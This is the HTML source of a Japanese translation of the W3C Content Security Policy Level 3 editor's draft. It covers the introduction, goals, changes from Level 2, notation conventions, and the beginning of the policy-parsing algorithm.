vr.状態code:#violation-status
vr.資源:#violation-resource
vr.列番号:#violation-column-number
vr.行番号:#violation-line-number
vr.要素:#violation-element

指令:#directives
指令~集合:#policy-directive-set
有効な指令:#request-effective-directive


埋込んでいる文書:#embedding-document
施行され:#enforced
	＊~source~listに合致する:#matches-a-source-list
監視され:#monitored
名前:#directive-name
施策:#policy
直列化形の~source~list:#serialized-source-list
直列化形の指令:#serialized-directive
直列化形の~CSP:#serialized-csp
直列化-:#serialized-csp
~source式:#source-expression
~source~list:#source-lists
値:#directive-value
違反:#violation


~ABNF:#biblio-RFC5234

施行-:#enforced
施行され:#enforced
監視-:#monitored
報告:#reports
~source式:#source-expression
報告先:~REPORTING#endpoint
	#directive-report-uri
報告先~group:~REPORTING#dom-report-group
	https://mikewest.github.io/error-reporting/#group
	端点:https://w3c.github.io/reporting/#endpoint

	●演算
A.要請前~検査:#directive-pre-request-check
A.要請後~検査:#directive-post-request-check
A.応答~検査:#directive-response-check
A.~inline検査:#directive-inline-check
A.初期化:#directive-initialization
A.~navi前~検査:#directive-pre-navigation-check
A.~navi応答~検査:#directive-navigation-response-check

A.構文解析-:#parse-serialized-policy
A.直列化形の~CSPとして構文解析-:#parse-serialized-policy

A.直列化形の~CSP~listとして構文解析-:#parse-serialized-policy-list
A1.新たな違反~obj:#create-violation-for-global
A.新たな違反~obj:#create-violation-for-request
A1.違反~objを作成-:#create-violation-for-global
A.違反~objを作成-:#create-violation-for-request
A.応答の~CSP~listを設定する:#set-response-csp-list

	sec.~CSP HTTP 応答~header:#csp-header
	sec.~Content-Security-Policy-Report-Only HTTP 応答~header:#cspro-header
	sec.~&lt;meta&gt; 要素:#meta-element
~Fetchとの統合:#fetch-integration
~HTMLとの統合:#html-integration

A.要請は~CSPにより阻止されるべきか？:#should-block-request
A.要請に対する応答は~CSPにより阻止されるべきか？:#should-block-response
A.大域~objの~CSP~listを初期化する:#initialize-global-object-csp
A.要素における~inline型の挙動は~CSPにより阻止されるべきか？:#should-block-inline
	#should-block-navigation-request
	#should-block-navigation-response

A.直列化-（非推奨）:#deprecated-serialize-violation
A.違反を報告する:#report-violation
	＊A.~CSP指令:#csp-directives

A.要請は施策に違反するか？:#does-request-violate-policy
A.~nonceは~source~listに合致するか？:#match-nonce-to-source-list
A.要請は~source~listに合致するか？:#match-request-to-source-list
A.要請に対する応答は~source~listに合致するか？:#match-response-to-source-list
A.~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？:#match-url-to-source-list
A.~urlは ( 生成元, ~redirect回数 ) について式に合致するか？:#match-url-to-source-expression
A.有効な指令を取得-:#effective-directive-for-a-request
	要請に対する有効な指令を取得する
A.要素 は ( 型, ~source ) について~source~listに合致するか？:#match-element-to-source-list
A.要素は~nonceableか？:#is-element-nonceable

	:#allow-base-for-document
	複数の施策による効果:#multiple-policies
A.文書の~CSP~listを初期化する:#initialize-document-csp
A.報告先~groupに対する~dataを待入する:~REPORTING#queue-report
	https://w3c.github.io/reporting/#queue-report
	https://mikewest.github.io/error-reporting/#queue-report


AO.HostEnsureCanCompileStrings:~TC39#sec-hostensurecancompilestrings
~realm:~TC39#realm

	@import:~CSSWG/css-cascade-4/#at-ruledef-import


~node文書:~DOM4#concept-node-document
~eventを発火-:~DOM4#concept-event-fire
~shadowも含む根:~DOM4#concept-shadow-including-root
接続されて:~DOM4#connected


doc.~CSP~list:~HTMLdom#concept-document-csp-list
	~TR/html52/dom.html#concept-document-csp-list

~CSP状態 http-equiv 処理命令:~HEmetadata#attr-meta-http-equiv-content-security-policy

base64 符号化-:~IETF/rfc4648#section-4

c.Function():~ES60#sec-function-objects
c.JSON.stringify():~ES60#sec-json.stringify
c.eval():~ES60#sec-eval-x


	●URLSpec
~URL:~URLSpec#url
u.IPv6~address:~URLSpec#concept-ipv6
u.~percent復号-:~URLSpec#percent-decode
u.~URL構文解析器:~URLSpec#concept-url-parser
u.~URL直列化器:~URLSpec#concept-url-serializer
	url.~URL:~URLSpec#url
u.既定~port:~URLSpec#default-port
u.生成元:~URLSpec#concept-url-origin
u.~host:~URLSpec#concept-url-host
u.~path:~URLSpec#concept-url-path
u.~port:~URLSpec#concept-url-port
u.~scheme:~URLSpec#concept-url-scheme
u.局所~scheme:~URLSpec#local-scheme
u.~network~scheme:~URLSpec#network-scheme

	●fetch
~fetch:~FETCH#concept-fetch
~HTTP~fetch:~FETCH#http-fetch
~HTTP-network~fetch:~FETCH#http-network-fetch
~main~fetch:~FETCH#main-fetch
~header~list:~FETCH#concept-header-list
~network~error:~FETCH#concept-network-error
A.~header値を構文解析-:~FETCH#concept-header-parse
A.~MIME型を抽出-:~FETCH#concept-header-extract-mime-type

応答:~FETCH#concept-response
rs.~CSP~list:~FETCH#concept-response-csp-list
rs.~header~list:~FETCH#concept-response-header-list
rs.~url:~FETCH#concept-response-url

要請:~FETCH#concept-request
rq.本体:~FETCH#concept-request-body
rq.~cache~mode:~FETCH#concept-request-cache-mode
rq.~client:~FETCH#concept-request-client
rq.資格証~mode:~FETCH#concept-request-credentials-mode
rq.現在の~url:~FETCH#concept-request-current-url
rq.行先:~FETCH#concept-request-destination
	＊rq.大域~obj:~FETCH#concept-request-global-object
rq.~header~list:~FETCH#concept-request-header-list
rq.起動元:~FETCH#concept-request-initiator
rq.~method:~FETCH#concept-request-method
rq.生成元:~FETCH#concept-request-origin
rq.~redirect~mode:~FETCH#concept-request-redirect-mode
rq.種別:~FETCH#concept-request-type
rq.~url:~FETCH#concept-request-url
rq.~window:~FETCH#concept-request-window
rq.~target閲覧文脈:~FETCH#concept-request-target-browsing-context
rq.暗号用~nonce~metadata:~FETCH#concept-request-nonce-metadata
rq.構文解析器~metadata:~FETCH#concept-request-parser-metadata
rq.完全性~metadata:~FETCH#concept-request-integrity-metadata
rq.~redirect回数:~FETCH#concept-request-redirect-count

~CSS規則を挿入する:~CSSOM#insert-a-css-rule
~CSS規則を構文解析する:~CSSOM#parse-a-css-rule
選択子の~groupを構文解析する:~CSSOM#parse-a-group-of-selectors
~CSS宣言~blockを構文解析する:~CSSOM#parse-a-css-declaration-block

	●HTML
閲覧文脈:~BROWSERS#browsing-context
属する閲覧文脈:~BROWSERS#concept-document-bc
親~閲覧文脈:~BROWSERS#parent-browsing-context
先祖~閲覧文脈:~BROWSERS#ancestor-browsing-context
入子の閲覧文脈:~BROWSERS#nested-browsing-context
	~TR/html52/browsers.html#nested-browsing-context
開いた閲覧文脈:~BROWSERS#opener-browsing-context
通して入子に:~BROWSERS#browsing-context-nested-through
~Unicode直列化-:~BROWSERS#unicode-serialisation-of-an-origin
作動中の文書:~BROWSERS#active-document
~sandbox用~指令を構文解析-:~BROWSERS#parse-a-sandboxing-directive
強制~sandbox用~flag集合:~BROWSERS#forced-sandboxing-flag-set
閲覧文脈~sandbox化( 生成元 )~flag:~BROWSERS#sandboxed-origin-browsing-context-flag
閲覧文脈~sandbox化( ~script )~flag:~BROWSERS#sandboxed-scripts-browsing-context-flag
~onenerを~NULL化:~BROWSERS#disowned-its-opener
結付けられている文書:~BROWSERS#concept-document-window

A.~navigate応答を処理する:~HTML5/browsers.html#process-a-navigate-response
A.~navigate~fetchを処理する:~HTML5/browsers.html#process-a-navigate-fetch

~iframe-srcdoc文書:~HTMLemb#an-iframe-srcdoc-document


x.文書:~WORKERS#the-worker's-documents
	'

~taskを待入する:~WAPI#queue-a-task
関連する大域~obj:~WAPI#concept-relevant-global
現在の設定群~obj:~WAPI#current-settings-object
大域~obj:~WAPI#global-object
x.大域~obj:~WAPI#concept-settings-object-global
	＊realm.大域~obj:~WAPI#concept-realm-global

新たな文書~objを初期化する:~HTML5/browsers.html#initialise-the-document-object

担当の閲覧文脈:~WAPI#responsible-browsing-context

生成元:~BROWSERS#concept-origin
	＊生成元:~IETF/rfc6454#section-3.2

構文解析-時に挿入され:~HEscripting#parser-inserted
~scriptを準備する:~HEscripting#prepare-a-script

~event~handler内容~属性:~WAPI#event-handler-content-attributes
~event~handler~IDL属性:~WAPI#event-handler-idl-attributes
関連する設定群~obj:~WAPI#relevant-settings-object
表現:~IETF/rfc7231#section-3
資源~表現:~IETF/rfc7231#section-3

~workerを走らす:~WORKERS#run-a-worker
凍結済み基底~URLを設定する:~HEmetadata#set-the-frozen-base-url

~ASCII大小無視:~HTMLINFRA#ascii-case-insensitive
~ASCII小文字化:~HTMLINFRA#converted-to-ascii-lowercase

~commaで分割-:~HTMLINFRA#split-a-string-on-commas
空白並びで分割-:~HTMLINFRA#split-a-string-on-spaces
厳密に分割-:~HTMLINFRA#strictly-split-a-string
~trusted:~HTMLINFRA#concept-event-trusted
妥当な~MIME型:~HTMLINFRA#valid-mime-type

~style~blockを更新する:~HEmetadata#update-a-style-block

~metadataを構文解析-:~SRI1#parse-metadata
	http://www.w3.org/TR/SRI/#parse-metadata
	https://w3c.github.io/webappsec-subresource-integrity/#parse-metadata

~HTTP状態code
~HTTP要請
~HTTP応答~header

	＊不要
	頭部と尾部の空白を剥いだ:~HTMLINFRA#strip-leading-and-trailing-whitespace
	~case-sensitive:~HTMLINFRA#case-sensitive
	文字~並びを収集-:~HTMLINFRA#collect-a-sequence-of-characters
	空白類:~HTMLINFRA#space-character

</script>

<!--%style -->
<style>
.wip { /* work in progress */
	background: #FCFAEE;
}

*[lang="en"] {
	white-space: pre-line;
}

.report {
	color: green;
}

.scheme {
	color: #006633;
}

.abstract {
	color: green;
}

samp {
	white-space: nowrap;
	background: #F0F0F0;
	margin-left: 0.5em;
	margin-right: 0.5em;
}

pre.http-code {
	background: #EEE;
}
pre.html-code {
	background: #FFE;
}

.idl-def > dt {
	font-family: monospace0, monospace;
}

i {
	color: purple;
}

</style>

</head>

<body>

<div style="display:none;"><input type="hidden" id="_page_config" value="" /></div>

<aside class="trans-meta">
<h1>Content Security Policy Level 3 日本語訳</h1>
<p>
<a id="_THIS_PAGE">このページ</a>
は、
<a href="http://www.w3.org/">W3C</a> により，副題の日付にて<strong >編集者草案</strong>として公開された
<a id="_SPEC_URL">Content Security Policy Level 3</a>
を日本語に翻訳したものです。
<strong >この翻訳の正確性は保証されません。</strong>
この仕様の公式な文書は英語版であり、この日本語版は公式のものではありません。
【 と 】で囲まれた部分は<span class="trans-note">【訳者による注釈】</span>です。
（<a href="index.html">他のウェブ関連仕様の一覧と共通機能の詳細</a>）
</p>

<p >
更新：<time>2016-10-20</time>
（公開：<time>2015-12-12</time> ）
</p>

<p>
このページの大部分はスクリプトにより生成されています（
古いブラウザなど，一部のブラウザには対応していません：
<span id="_GENERATING"></span>）。
</p>

<p>
本文ダブルクリックで当該箇所の原文が表示されます（左下隅に各種 表示切替ボタン — CSS や DOM の対応が古いブラウザでは、一部機能しないことがあります）。
</p>

<address id="_CONTACT">　</address>

</aside>


<header>
<a href="https://www.w3.org/" id="_W3C">W3C</a>
	<hgroup>
<h1 id="title">Content Security Policy Level 3</h1>
<h2 id="subtitle">2016 年 10 月 18 日付 編集者草案</h2>
	</hgroup>
<dl id="_versions">
	<dt title="This version:">このバージョン</dt>
	<dt title="Editor’s Draft:">編集者草案</dt>
	<dd>https://w3c.github.io/webappsec-csp/</dd>

	<dt title="Latest published version:">最新発行バージョン</dt>
	<dd>https://www.w3.org/TR/CSP3/</dd>

	<dt title="Previous Versions:">以前のバージョン</dt>
	<dd>https://www.w3.org/TR/2016/WD-CSP3-20160901/</dd>

	<dt title="Version History:">バージョン履歴</dt>
	<dd>https://github.com/w3c/webappsec-csp/commits/master/index.src.html</dd>

	<dt title="Feedback:">フィードバック</dt>
	<dd><a href="mailto:public-webappsec@w3.org?subject=%5BCSP3%5D%20YOUR%20TOPIC%20HERE">public-webappsec@w3.org</a> with subject line “<kbd>[CSP3] <i data-lt="">… message topic …</i></kbd>” (<a href="https://lists.w3.org/Archives/Public/public-webappsec/" rel="discussion">archives</a>)</dd>

	<dt title="Editors:">編集</dt>
	<dd><a href="mailto:mkwst@google.com">Mike West</a> (Google Inc.)</dd>

	<dt>Participate:</dt>
	<dd><a href="https://github.com/w3c/webappsec-csp/issues/new">File an issue</a> (<a href="https://github.com/w3c/webappsec-csp/issues">open issues</a>)</dd>
</dl>

<small class="copyright">
<a href="http://www.w3.org/Consortium/Legal/ipr-notice#Copyright">Copyright</a> © 2016 <a href="http://www.w3.org/"><abbr title="World Wide Web Consortium">W3C</abbr></a><sup>®</sup> (<a href="http://www.csail.mit.edu/"><abbr title="Massachusetts Institute of Technology">MIT</abbr></a>, <a href="http://www.ercim.eu/"><abbr title="European Research Consortium for Informatics and Mathematics">ERCIM</abbr></a>, <a href="http://www.keio.ac.jp/">Keio</a>, <a href="http://ev.buaa.edu.cn/">Beihang</a>). W3C <a href="http://www.w3.org/Consortium/Legal/ipr-notice#Legal_Disclaimer">liability</a>, <a href="http://www.w3.org/Consortium/Legal/ipr-notice#W3C_Trademarks">trademark</a> and <a href="http://www.w3.org/Consortium/Legal/copyright-documents">document use</a> rules apply.
</small>

</header>

<div id="MAIN" style="display:none;">

	<section id="abstract">
<h2 title="Abstract">要約</h2>

<p>
この文書は、特定0の~pageが どの資源を~fetchあるいは実行できるか，および
保安に関連する数々の施策~~決定について，~web開発者が制御できる仕組みを定義する。
◎
This document defines a mechanism by which web developers can control the resources which a particular page can fetch or execute, as well as a number of security-relevant policy decisions.
</p>


	</section>
	<section id="status">
<h2 title="Status of this document">この文書の位置付け</h2>

<p>
<!-- 
この節では、発行時点における…
-->
これは編集者草案の~~公開の複製です…
<span class="trans-note">【
以下、この節の他の内容は
<a href="w3c-common-ja.html#status" >W3C 日本語訳 共通ページ</a>
に委譲
】</span></p>

<p>
<strong>
この文書に対する変更点は、
<a href="https://github.com/w3c/webappsec">https://github.com/w3c/webappsec</a>
に。
</strong>
◎
Changes to this document may be tracked at https://github.com/w3c/webappsec.
</p>

<p>
この仕様に関する討論の場は、冒頭の “フィードバック” に挙げた ML にて。
◎
The (archived) public mailing list public-webappsec@w3.org (see instructions) is preferred for discussion of this specification. When sending e-mail, please put the text “CSP3” in the subject, preferably like this: “[CSP3] …summary of comment…”
</p>

<p>
この文書は、
<a href="http://www.w3.org/2011/webappsec/">Web Application Security Working Group</a>
作業草案として制作されました。
◎
This document was produced by the Web Application Security Working Group.
</p>


<p>
次の特色機能は
<a href="w3c-common-ja.html#at-risk">~risk下</a>
にあり，勧告候補の期間~中に取下げらるかもしれません：
◎
The following features are at-risk, and may be dropped during the CR period:
</p>

<ul>
	<li>
`要素は~nonceableか？$A
~algo
◎
The §6.6.2.1 Is element nonceable? algorithm. 
</li>
</ul>


	</section>

<main id="MAIN0">

	<section id="intro">
<h2 title="Introduction">1. 序論</h2>

~INFORMATIVE

<p>
この文書は、
<dfn id="content-security-policy">Content Security Policy</dfn>
 （略称 CSP
— “内容~保安~施策”, または単に “施策”
）を定義する†。
それは、開発者が自身の~appを種々の仕方で監禁して，［
~XSS（ cross-site scripting ）などに対する内容~注入~脆弱性の~riskを軽減する ／ ~appを実行する際に用いる特権を抑制する
］ために利用できる~toolである。
◎
This document defines Content Security Policy (CSP), a tool which developers can use to lock down their applications in various ways, mitigating the risk of content injection vulnerabilities such as cross-site scripting, and reducing the privilege with which their applications execute.
</p>

<p class="trans-note">【†
この訳では、原文の［
“Content Security Policy” ／ “content security policy” ／ “CSP”
］を，一律に “CSP” と記すことにする。
】</p>

<p>
~CSPは、内容~注入の脆弱性に対抗する前線防御として意図されたものではなく、多層防御としての利用に最も適する。
【すなわち、注入そのものを防ぐのでなく，注入されたものが効果を及ぼすのを防ぐ。】
それは、悪意的な注入により生じ得る被害を抑制するが、外からの入力に対する注意深い検証や，出力の安全な形への符号化-
【すなわち，前線防御】
の代用になるものではない。
◎
CSP is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth. It reduces the harm that a malicious injection can cause, but it is not a replacement for careful input validation and output encoding.
</p>

<div class="p">
<p>
この文書は，~CSP Level 2 の繰り返しであるが、次の二点を目標にしている：
</p>

<ul>
	<li>
CSP, ~HTML, ~Fetch
間の相互作用を より明確に説明する。
</li>
	<li>
~modularに拡張するための明確な各種~hookを提供する。
</li>
</ul>

<p>
これは、理想的には、安定的な中核を形成して，その上に新たな機能性を築けるようにする。
</p>

◎
This document is an iteration on Content Security Policy Level 2, with the goal of more clearly explaining the interactions between CSP, HTML, and Fetch on the one hand, and providing clear hooks for modular extensibility on the other. Ideally, this will form a stable core upon which we can build new functionality.
</div>

		<section id="examples">
<h3 title="Examples">1.1. 例</h3>

			<section id="example-basic">
<h4 title="Control Execution">1.1.1. 実行~制御</h4>

<div class="example">

<p>
MegaCorp Inc の~web開発者たちは、~XSS攻撃に対抗して保護することが求められているとする。
彼らが信用する CDN の生成元から読込まれる~scriptのみ，実行-可能にすることにより、~script注入による~riskを軽減できる。
加えて、彼らの~pageの文脈~下では，どの~pluginも実行させなくしたいとする。
そのような効果は、次の施策で得られる：
◎
MegaCorp Inc’s developers want to protect themselves against cross-site scripting attacks. They can mitigate the risk of script injection by ensuring that their trusted CDN is the only origin from which script can load and execute. Moreover, they wish to ensure that no plugins can execute in their pages' contexts. The following policy has that effect:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `script-src$dir https://cdn.example.com/scripts/;
    `object-src$dir `none$pl
</pre>

<p class="trans-note">【
長い行を~page横幅に収める都合により, あるいは読みやすくするため、この訳~全体を通して， HTTP ~headerの例示~codeでは、長い行は折り返した上で，字下げした形で示す
— HTTP/1.1 の構文としては、折返しは許容されないことに注意。
】</p>

</div>



			</section>
		</section>
		<section id="goals">
<h3 title="Goals">1.2. 目標</h3>

<p>
~CSPが目指すものは：
◎
Content Security Policy aims to do to a few related things:
</p>

<ol>
	<li>
<p>
内容~注入~攻撃による~riskを軽減するような，次についての相応に細かい制御を、~web開発者に与える：
◎
Mitigate the risk of content-injection attacks by giving developers fairly granular control over
</p>
		<ul>
			<li>
特定の `文書$ や `Worker$I が，それ自身のために どの資源を要請できるか（および，後続して 自身に埋込めるか／実行できるか）について。
◎
The resources which can be requested (and subsequently embedded or executed) on behalf of a specific Document or Worker
</li>
			<li>
~inline~scriptの実行。
◎
The execution of inline script
</li>
			<li>
動的な（ `eval()^c その他の類似する構成子を介する）~code実行。
◎
Dynamic code execution (via eval() and similar constructs)
</li>
			<li>
~inline~styleの適用。
◎
The application of inline style
</li>
		</ul>
	</li>
	<li>
［
どの生成元が，所与の資源を埋込めるか
］についての細かい制御を ~web開発者に与えて、［
資源が悪意的な文脈~内に埋込まれることを要するような攻撃（ `TIMING$r に述べられた “Pixel Perfect” 攻撃, 等々）
］による~riskを軽減する。
◎
Mitigate the risk of attacks which require a resource to be embedded in a malicious context (the "Pixel Perfect" attack described in [TIMING], for example) by giving developers granular control over the origins which can embed a given resource.
</li>
	<li>
［
開発者が自身の~appの特権を抑制できるようにする
］ための，施策の枠組みを提供する。
◎
Provide a policy framework which allows developers to reduce the privilege of their applications.
</li>
	<li>
［
~~外から悪用されている欠陥を，~web開発者が検知できるようにする
］ための，報告処理の仕組みを提供する。
◎
Provide a reporting mechanism which allows developers to detect flaws being exploited in the wild.
</li>

</ol>



		</section>
		<section id="changes-from-level-2">
<h3 title="Changes from Level 2">1.3. ~level 2 からの変更点</h3>

<p>
この文書は、~CSP Level 2 仕様からの発展を述べる。
`CSP2$r からの変更点についての，高次からの概観は：
◎
This document describes an evolution of the Content Security Policy Level 2 specification [CSP2]. The following is a high-level overview of the changes:
</p>

<ol>
	<li>
仕様は、他の仕様（特に Service Worker ）が，~CSPの各種 要件と制約を より単純に統合できるようにすべく、
`FETCH$r 仕様の用語を通して，~~土台から書き直された。
◎
The specification has been rewritten from the ground up in terms of the [FETCH] specification, which should make it simpler to integrate CSP’s requirements and restrictions with other specifications (and with Service Workers in particular).
</li>
	<li>
CSP Level 2 で非推奨にされた `frame-src$dir 指令は，非推奨でなくなり、 `worker-src$dir が追加された。
両者とも無い場合は `child-src$dir に先送りする（それも無い場合は `default-src$dir に先送りする）。
◎
The frame-src directive, which was deprecated in CSP Level 2, has been undeprecated, and a worker-src directive added. Both defer to child-src if not present (which defers to default-src in turn).
</li>
	<li>
<p>
~URL照合~algoは、今や
非保安的［
~scheme／~port
］を その保安的~scheme版に合致するように扱う。
すなわち、`~source式$
`http://example.com:80^s
は
`http://example.com:80^s,
`https://example.com:443^s
の両者に合致することになる。
◎
The URL matching algorithm now treats insecure schemes and ports as matching their secure variants. That is, the source expression http://example.com:80 will match both http://example.com:80 and https://example.com:443.
</p>

<p>
同様に `self$pl は、
`http^sc ~schemeの~page上であっても，［
~pageの生成元の~schemeを［
`https^sc ／ `wss^sc
］に置き換えた生成元
］にも合致するようにされた。
◎
Likewise, 'self' now matches https: and wss: variants of the page’s origin, even on pages whose scheme is http.
</p>
	</li>


<li>
~inlineの［
~script／~style
］から生成される違反~報告は、今や 阻止された`資源$vrとして `inline^l を報告するようになった。
同様に，阻止された `eval()^c 実行は、阻止された`資源$vrとして `eval^l を報告するようになった。
◎
Violation reports generated from inline script or style will now report "inline" as the blocked resource. Likewise, blocked eval() execution will report "eval" as the blocked resource.
</li>
	<li>
`manifest-src$dir 指令が追加された。
◎
The manifest-src directive has been added.
</li>
	<li>
新たな `report-to$dir 指令への支持を受けて、
`report-uri$dir 指令は非推奨にされた。
`report-to^dir は、基盤として `OOB-REPORTING$r に依拠する。
◎
The report-uri directive is deprecated in favor of the new report-to directive, which relies on [OOB-REPORTING] as infrastructure.
</li>
	<li>
`strict-dynamic^pl ~source式は、今や［
~page上で実行する~scriptが、`構文解析-時に挿入され$たものでない `script$e 要素を介して，更に~scriptを読込む
］ことを許容する。
詳細は
<a href="#strict-dynamic-usage">`strict-dynamic^pl の用法</a>
節に。
◎
The 'strict-dynamic' source expression will now allow script which executes on a page to load more script via non-parser-inserted script elements. Details are in §8.2 Usage of "'strict-dynamic'".
</li>
	<li class="wip">
<p>
`unsafe-hashed-attributes$pl ~source式は、今や［
~event~handlerや~style属性が，~hash~source式に合致する
］ことを許容する。
詳細は
<a href="#unsafe-hashed-attributes-usage">`unsafe-hashed-attributes^pl の用法</a>
節に。
◎
The 'unsafe-hashed-attributes' source expression will now allow event handlers and style attributes to match hash source expressions. Details in §8.3 Usage of "'unsafe-hashed-attributes'".
</p>

<p class="issue">
`unsafe-hashed-attributes^pl はまだ策定段階にある。
<a href="https://github.com/w3c/webappsec-csp/issues/13">&lt;https://github.com/w3c/webappsec-csp/issues/13&gt;</a>
◎
unsafe-hashed-attributes is a work in progress. &lt;https://github.com/w3c/webappsec-csp/issues/13&gt;
</p>
	</li>
	<li>
`~source式$の照合では、`局所~scheme$uのみならず，被保護~資源の~schemeと同じでない どの非`~network~scheme$uも，明示的に~whitelist化することが要求されるようになった
— `~urlは ( 生成元, ~redirect回数 ) について式に合致するか？$A
を見よ。
◎
The source expression matching has been changed to require explicit whitelisting of any non-network scheme, rather than local scheme, unless that non-network scheme is the same as the scheme of protected resource, as described in §6.6.1.6 Does url match expression in origin with redirect count?.
</li>
	<li class="wip">
<p >
~hashに基づく~source式は、今や，外部~scriptを~whitelist化できる
— 要請を誘発する当の `script$e 要素に［
現在の施策により~whitelist化されている完全性~metadataの集合
］を指定することで。
詳細は、
<a href="#external-hash">外部~JSに対する~hashによる~whitelist化</a>
節を見よ。
◎
Hash-based source expressions may now whitelist external scripts if the script element that triggers the request specifies a set of integrity metadata which is whitelisted by the current policy. Details in §8.4 Whitelisting external JavaScript with hashes.
</p>

<p class="issue">
`SRI$r との統合はまだ策定段階にある。
<a href="https://github.com/w3c/webappsec-csp/issues/78">&lt;https://github.com/w3c/webappsec-csp/issues/78&gt;</a>
◎
SRI integration is a work in progress. &lt;https://github.com/w3c/webappsec-csp/issues/78&gt;
</p>
	</li>

	<li>
`disown-opener$dir 指令は、<!-- ＊ -->内容に対する制御を別の閲覧文脈に与えるような仕方では，資源を開けないことを確保する。
◎
The disown-opener directive ensures that a resource can’t be opened in such a way as to give another browsing context control over its contents.
</li>
	<li>
`navigation-to$dir 指令は、~naviを起動できる端点に対する制御を，資源に与える。
◎
The navigation-to directive gives a resource control over the endpoints to which it can initiate navigation.
</li>
</ol>


		</section>
	</section>
	<section id="_conventions">
<h2 class="trans-note">【この訳に固有の表記規約】</h2>

<p>
この訳の，~algoや定義の記述に利用されている各種記号（ ~LET, ~EQ, ~IF, ~THROW, 等々）の意味や定義の詳細は、~SYMBOL_DEF_REFを~~参照されたし。
</p>

<p>
記号［
~EQ, ~NEQ, ~IN, ~NIN
］に添えられる
“<dfn id="ascii-case_insensitive"><sub>大小無視</sub></dfn>”
は、記号の意味を `~ASCII大小無視$による比較に基づくように改めることを表す。
</p>

<p>
特に断らない限り、文字列の比較は文字大小区別とする。
</p>

<p>
~protocol要素
`ALPHA@P,
`DIGIT@P,
`VCHAR@P
は、
`RFC5234$r
<a href="~IETF/rfc5234#appendix-B.1">B.1 節</a>
にて定義される。
~protocol要素
`OWS@P,
`RWS@P,
は、 `RFC7230$r
<a href="~IETF/rfc7230#section-3.2.3">3.2.3 節</a>
にて定義される。
</p>


<p>
次の符号位置も利用される：
</p>

<table>
<thead><tr><th>表記
</th><th>符号位置

<tbody><tr><th>`~asterisk@
</th><td>U+002A ASTERISK ( `*^l )

</td></tr><tr><th>`~semicolon@
</th><td>U+003B SEMICOLON ( `;^l )

</td></tr><tr><th>`~slash@
</th><td>U+002F SOLIDUS ( `/^l )

<!-- 
</td></tr><tr><th>period
</th><td>U+002E FULL STOP ( `.^l )
-->

</td></tr></tbody></table>

<p>
次の~styleが表記に用いられる：
</p>

<ul>
	<li>
`production^p
— ~protocol要素（ ABNF 生成規則）
</li>
	<li>
`example-directive$dir
— ~CSP `指令$
</li>
	<li>
`literal^lt
— 文字列~literal（引用符は~dataに含まれない）
</li>
	<li>
`literal^pl
— 文字列~literal。
引用符も~dataに<em >含まれる</em>。
</li>
	<li>
`Example-Header^h
— HTTP ~header名
</li>
	<li>
`element^e
— ~HTML要素
</li>
	<li>
`attribute^a
— ~HTML内容~属性
</li>
	<li>
`idl-construct^I
— 他の~code類（~IDL属性など）
</li>
	<li>
`sample-code^s
— （地の文の中の）見本~code類
</li>
</ul>

<p>
長い行を~page横幅に収める都合により, あるいは読みやすくするため、
HTTP ~headerの例示~codeでは、長い行は折り返した上で，字下げした形で示される
— HTTP/1.1 の構文としては、折返しは許容されないことに注意。
</p>

	</section>
	<section id="framework">
<h2 title="Framework">2. 枠組み</h2>

		<section id="framework-policy">
<h3 title="Policies">2.1. 施策</h3>

<p>
`施策@
は、［
許容される／制約される
］挙動の集合を定義する。
それは、［
`大域~objの~CSP~listを初期化する$A~algo
］に従って［
`Window$I ／ `WorkerGlobalScope$I
］に適用し得る。
◎
A policy defines a set of allowed and restricted behaviors, and may be applied to a Window or WorkerGlobalScope as described in §4.2.2 Initialize a global object’s CSP list.
</p>

<p>
各~施策には、次のものが結付けられる：
◎
↓</p>

<dl>
	<dt>`指令~集合@ （ directive set ）</dt>
	<dd>
この施策が適用されるときの含意を定義する，`指令$の集合。
◎
Each policy has an associated directive set, which is a set of directives that define the policy’s implications when applied.
</dd>

	<dt>`処分先@ （ disposition ）</dt>
	<dd>
次のいずれか：
`enforce^l ／ `report^l
◎
Each policy has an associated disposition , which is either "enforce" or "report".
</dd>
	<dd class="trans-note">【
順に，施策を［
施行する／報告する
］ことに対応する。
】</dd>

	<dt>`直列化形の~CSP@ （ serialized CSP ）</dt>
	<dd>
一連の`直列化形の指令$を`~semicolon$で区切って連結した， ASCII 文字列であり、次の`~ABNF$文法に従う：
◎
A serialized CSP is an ASCII string, consisting of a semicolon-delimited series of serialized directives, adhering to the following ABNF grammar [RFC5234]:
</dd>

</dl>

<pre class="ABNF">
`serialized-policy@p =
      `serialized-directive$p
      *( `OWS$P ";" [ `OWS$P `serialized-directive$p ] )
; OWS is defined in section 3.2.3 of RFC 7230
</pre>

			<section id="parse-serialized-policy">
<h4 title="Parse a serialized CSP as disposition">2.1.1. `直列化形の~CSP^v を %処分先 向けに構文解析する</h4>

<p>
次の~algoは、所与の
( `直列化形の~CSP$ `直列化形の~CSP^v, `処分先$ %処分先 )
に対し，`施策$ ~objを返す。
構文解析できない場合、結果の`施策$の`指令~集合$は空になる：
◎
Given a serialized CSP (serialized CSP), and a disposition (disposition), this algorithm will return a policy object. If the string cannot be parsed, the resulting policy’s directive set will be empty.
</p>

<ol>
	<li>
%指令~集合 ~LET 空~集合
◎
Let policy be a new policy with an empty directive set, and a disposition of disposition.
</li>
	<li>
<p>
~FOR ［
`直列化形の~CSP^v を`~semicolon$で`厳密に分割-$した結果
］内の ~EACH ( %~token ) に対し：
◎
For each token returned by strictly splitting serialized CSP on the U+003B SEMICOLON character (;):
</p>
		<ol>
			<li>
%~list ~LET %~token を`空白並びで分割-$した結果
◎
Strip leading and trailing whitespace from token.
</li>
			<li>
~IF［
%~list は空である
］
⇒
~CONTINUE
◎
If token is an empty string, skip the remaining substeps and continue to the next item.
</li>
			<li>
%指令~名 ~LET %~list の先頭の~item
◎
Let directive name be the result of collecting a sequence of characters from token which are not space characters.
</li>
			<li>
<p>
~IF［
%指令~集合 内に［
`名前$ ~EQ %指令~名
］なる`指令$はある
］
⇒
~CONTINUE
◎
If policy’s directive set contains a directive whose name is directive name, skip the remaining substeps and continue to the next item.
</p>

<p>
~UAは、指令が無視されたことを~web開発者に通知する~SHOULDである。
例えば，~consoleによる警告が適切になるであろう。
◎
The user agent SHOULD notify developers that a directive was ignored. A console warning might be appropriate, for example.
</p>
			</li>
			<li>
%指令~値 ~LET %~list から先頭の~itemを除去した結果の~list
◎
Let directive value be the result of splitting token on spaces.
</li>
			<li>
新たな`指令$( %指令~名, %指令~値 ) を %指令~集合 に追加する
◎
